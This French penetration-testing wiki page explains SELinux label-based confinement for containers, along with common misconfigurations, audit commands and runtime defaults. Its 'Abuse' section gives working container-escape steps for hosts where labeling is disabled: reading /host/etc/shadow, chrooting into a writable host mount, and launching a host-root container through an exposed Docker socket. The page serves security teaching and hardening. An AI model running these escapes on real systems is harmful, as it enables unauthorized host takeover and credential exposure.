# SELinux

{{#include ../../../../banners/hacktricks-training.md}}

## Présentation

SELinux est un système de **contrôle d'accès obligatoire basé sur les labels**. Chaque processus et objet pertinent peut porter un contexte de sécurité, et la policy décide quels domaines peuvent interagir avec quels types et de quelle manière. Dans les environnements conteneurisés, cela signifie généralement que le runtime lance le processus du conteneur dans un domaine de conteneur confiné et étiquette le contenu du conteneur avec les types correspondants. Si la policy fonctionne correctement, le processus peut être capable de lire et d'écrire les éléments que son label est censé manipuler, tout en se voyant refuser l'accès aux autres contenus de l'hôte, même si ces contenus deviennent visibles via un mount.

Il s'agit de l'une des protections côté hôte les plus puissantes disponibles dans les déploiements de conteneurs Linux courants. Elle est particulièrement importante sur Fedora, RHEL, CentOS Stream, OpenShift et les autres écosystèmes fortement axés sur SELinux. Dans ces environnements, un reviewer qui ignore SELinux comprendra souvent mal pourquoi un chemin apparemment évident vers la compromission de l'hôte est en réalité bloqué.

## AppArmor Vs SELinux

La différence générale la plus simple est qu'AppArmor est basé sur les chemins, tandis que SELinux est **basé sur les labels**. Cela a d'importantes conséquences pour la sécurité des conteneurs. Une policy basée sur les chemins peut se comporter différemment si le même contenu de l'hôte devient visible sous un chemin de mount inattendu. Une policy basée sur les labels demande plutôt quel est le label de l'objet et ce que le domaine du processus peut faire avec celui-ci. Cela ne rend pas SELinux simple, mais le rend robuste face à une catégorie d'hypothèses basées sur des manipulations de chemins que les défenseurs peuvent parfois faire accidentellement dans les systèmes basés sur AppArmor.

Comme le modèle est orienté labels, la gestion des volumes des conteneurs et les décisions de relabeling sont critiques pour la sécurité. Si le runtime ou l'opérateur modifie les labels de manière trop large pour « faire fonctionner les mounts », la limite de la policy censée contenir la workload peut devenir bien plus faible que prévu.

## Laboratoire

Pour vérifier si SELinux est actif sur l'hôte :
```bash
getenforce 2>/dev/null
sestatus 2>/dev/null
```
Pour inspecter les labels existants sur l’hôte :
```bash
ps -eZ | head
ls -Zd /var/lib/containers 2>/dev/null
ls -Zd /var/lib/docker 2>/dev/null
```
Pour comparer une exécution normale à une exécution où l'étiquetage est désactivé :
```bash
podman run --rm fedora cat /proc/self/attr/current
podman run --rm --security-opt label=disable fedora cat /proc/self/attr/current
```
Sur un hôte où SELinux est activé, il s'agit d'une démonstration très pratique, car elle montre la différence entre une workload s'exécutant dans le domain de conteneur attendu et une autre dont cette couche d'enforcement a été supprimée.

## Utilisation à l'exécution

Podman est particulièrement bien adapté à SELinux sur les systèmes où SELinux fait partie des paramètres par défaut de la plateforme. Podman rootless associé à SELinux constitue l'une des bases de sécurité mainstream les plus solides pour les conteneurs, car le processus est déjà non privilégié du côté de l'hôte tout en restant confiné par une MAC policy. Docker peut également utiliser SELinux lorsqu'il est pris en charge, bien que les administrateurs le désactivent parfois pour contourner les problèmes liés au labeling des volumes. CRI-O et OpenShift s'appuient fortement sur SELinux dans le cadre de leur isolation des conteneurs. Kubernetes peut également exposer des paramètres liés à SELinux, mais leur valeur dépend évidemment du fait que l'OS du nœud prenne réellement en charge et applique SELinux.<sup>[[2]](#references)</sup>

La leçon récurrente est que SELinux n'est pas un élément facultatif. Dans les écosystèmes conçus autour de lui, il fait partie de la security boundary attendue.

## Mauvaises configurations

L'erreur classique est `label=disable`. En pratique, cela se produit souvent parce qu'un volume mount a été refusé et que la solution temporaire la plus rapide a consisté à retirer SELinux de l'équation plutôt qu'à corriger le modèle de labeling.<sup>[[1]](#references)</sup> Une autre erreur courante est le relabeling incorrect du contenu de l'hôte. Les opérations de relabeling étendues peuvent permettre à l'application de fonctionner, mais elles peuvent également élargir considérablement ce que le conteneur est autorisé à toucher par rapport à l'intention initiale.

Il est également important de ne pas confondre SELinux **installé** avec SELinux **effectif**. Un hôte peut prendre en charge SELinux tout en étant en mode permissive, ou le runtime peut ne pas lancer la workload dans le domain attendu. Dans ces cas, la protection est bien plus faible que ne pourrait le laisser penser la documentation.

## Abuse

Lorsque SELinux est absent, en mode permissive ou largement désactivé pour la workload, les chemins montés depuis l'hôte deviennent beaucoup plus faciles à exploiter. Le même bind mount qui aurait autrement été limité par les labels peut devenir un accès direct aux données de l'hôte ou à leur modification. Cela est particulièrement pertinent lorsqu'il est combiné à des writable volume mounts, à des répertoires du container runtime ou à des raccourcis opérationnels qui exposent des chemins sensibles de l'hôte par commodité.

SELinux explique souvent pourquoi un writeup de breakout générique fonctionne immédiatement sur un hôte, mais échoue systématiquement sur un autre, même lorsque les runtime flags semblent similaires. L'élément manquant n'est souvent ni un namespace ni une capability, mais une label boundary restée intacte.

La vérification pratique la plus rapide consiste à comparer le context actif, puis à sonder les chemins montés de l'hôte ou les répertoires du runtime qui seraient normalement confinés par des labels :
```bash
getenforce 2>/dev/null
cat /proc/self/attr/current
find / -maxdepth 3 -name '*.sock' 2>/dev/null | grep -E 'docker|containerd|crio'
find /host -maxdepth 2 -ls 2>/dev/null | head
```
Si un host bind mount est présent et que le labeling SELinux a été désactivé ou affaibli, la divulgation d’informations survient souvent en premier :
```bash
ls -la /host/etc 2>/dev/null | head
cat /host/etc/passwd 2>/dev/null | head
cat /host/etc/shadow 2>/dev/null | head
```
Si le mount est writable et que le conteneur est effectivement host-root du point de vue du kernel, l’étape suivante consiste à tester une modification contrôlée de l’hôte plutôt qu’à deviner :
```bash
touch /host/tmp/selinux_test 2>/dev/null && echo "host write works"
ls -l /host/tmp/selinux_test 2>/dev/null
```
Sur les hôtes compatibles avec SELinux, la perte des labels autour des répertoires d’état d’exécution peut également exposer des voies directes d’escalade de privilèges :
```bash
find /host/var/run /host/run -maxdepth 2 -name '*.sock' 2>/dev/null
find /host/var/lib -maxdepth 3 \( -name docker -o -name containers -o -name containerd \) 2>/dev/null
```
Ces commandes ne remplacent pas une chaîne complète d’évasion, mais elles permettent de déterminer très rapidement si SELinux est à l’origine du blocage de l’accès aux données de l’hôte ou de la modification de fichiers côté hôte.

### Exemple complet : SELinux désactivé + montage de l’hôte accessible en écriture

Si l’étiquetage SELinux est désactivé et que le système de fichiers de l’hôte est monté avec un accès en écriture sur `/host`, une évasion complète de l’hôte devient un cas normal d’abus de bind mount :
```bash
getenforce 2>/dev/null
cat /proc/self/attr/current
touch /host/tmp/selinux_escape_test
chroot /host /bin/bash 2>/dev/null || /host/bin/bash -p
```
Si `chroot` réussit, le processus du conteneur s’exécute désormais depuis le système de fichiers de l’hôte :
```bash
id
hostname
cat /etc/passwd | tail
```
### Exemple complet : SELinux désactivé + répertoire du runtime

Si la workload peut atteindre un socket du runtime une fois les labels désactivés, l’évasion peut être déléguée au runtime :
```bash
find /host/var/run /host/run -maxdepth 2 -name '*.sock' 2>/dev/null
docker -H unix:///host/var/run/docker.sock run --rm -it -v /:/mnt ubuntu chroot /mnt bash 2>/dev/null
ctr --address /host/run/containerd/containerd.sock images ls 2>/dev/null
```
L’observation pertinente est que SELinux était souvent le contrôle empêchant précisément ce type d’accès aux chemins de l’hôte ou à l’état d’exécution.

## Vérifications

L’objectif des vérifications SELinux est de confirmer que SELinux est activé, d’identifier le contexte de sécurité actuel et de déterminer si les fichiers ou chemins qui vous intéressent sont effectivement confinés par des labels.
```bash
getenforce                              # Enforcing / Permissive / Disabled
ps -eZ | grep -i container              # Process labels for container-related processes
ls -Z /path/of/interest                 # File or directory labels on sensitive paths
cat /proc/self/attr/current             # Current process security context
```
Ce qui est intéressant ici :

- `getenforce` devrait idéalement retourner `Enforcing` ; `Permissive` ou `Disabled` modifie la signification de toute la section SELinux.
- Si le contexte du processus actuel semble inattendu ou trop large, le workload peut ne pas s’exécuter avec la policy de container prévue.
- Si les fichiers montés depuis l’hôte ou les répertoires runtime possèdent des labels auxquels le processus peut accéder trop librement, les bind mounts deviennent beaucoup plus dangereux.

Lors de l’examen d’un container sur une platform compatible avec SELinux, ne considérez pas le labeling comme un détail secondaire. Dans de nombreux cas, c’est l’une des principales raisons pour lesquelles l’hôte n’est pas déjà compromis.

## Runtime Defaults

| Runtime / platform | Default state | Default behavior | Common manual weakening |
| --- | --- | --- | --- |
| Docker Engine | Host-dependent | La séparation SELinux est disponible sur les hôtes où SELinux est activé, mais le comportement exact dépend de la configuration de l’hôte et du daemon | `--security-opt label=disable`, broad relabeling des bind mounts, `--privileged` |
| Podman | Commonly enabled on SELinux hosts | La séparation SELinux fait normalement partie de Podman sur les systèmes SELinux, sauf si elle est désactivée | `--security-opt label=disable`, `label=false` dans `containers.conf`, `--privileged` |
| Kubernetes | Not generally assigned automatically at Pod level | Le support de SELinux existe, mais les Pods nécessitent généralement `securityContext.seLinuxOptions` ou des valeurs par défaut spécifiques à la platform ; le support du runtime et du node est requis | `seLinuxOptions` faibles ou trop larges, exécution sur des nodes en mode permissive/disabled, policies de platform qui désactivent le labeling |
| CRI-O / OpenShift style deployments | Commonly relied on heavily | SELinux constitue souvent une partie essentielle du modèle d’isolation des nodes dans ces environnements | custom policies qui élargissent excessivement l’accès, désactivation du labeling pour des raisons de compatibilité |

Les valeurs par défaut de SELinux dépendent davantage de la distribution que celles de seccomp. Sur les systèmes de type Fedora/RHEL/OpenShift, SELinux est souvent au cœur du modèle d’isolation. Sur les systèmes qui ne prennent pas en charge SELinux, il est tout simplement absent.

## References

- [1] [Podman Documentation: --security-opt=option (label=disable)](https://docs.podman.io/en/v4.6.0/markdown/options/security-opt.html)
- [2] [Kubernetes: Configure a Security Context for a Pod or Container](https://kubernetes.io/docs/tasks/configure-pod-container/security-context/)

{{#include ../../../../banners/hacktricks-training.md}}
